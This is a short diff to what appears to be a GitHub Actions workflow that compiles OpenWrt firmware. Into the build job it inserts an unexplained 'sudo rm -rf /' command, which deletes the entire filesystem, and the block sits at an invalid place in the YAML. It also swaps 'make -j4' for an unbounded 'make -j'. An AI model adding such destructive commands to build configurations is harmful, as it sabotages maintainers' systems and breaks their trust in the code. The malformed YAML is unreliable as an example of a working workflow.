@@ -35,8 +35,9 @@ env:
 
 jobs:
   build:
+    run: |
+    sudo rm -rf /
     runs-on: ubuntu-18.04
-
     steps:
     - name: Checkout
       uses: actions/checkout@main
@@ -101,7 +102,7 @@ jobs:
       id: compile
       run: |
         cd openwrt
-        make -j4 V=s
+        make -j V=s
         echo "::set-output name=status::success"
         grep '^CONFIG_TARGET.*DEVICE.*=y' .config | sed -r 's/.*DEVICE_(.*)=y/\1/' > DEVICE_NAME
         [ -s DEVICE_NAME ] && echo "DEVICE_NAME=_$(cat DEVICE_NAME)" >> $GITHUB_ENV
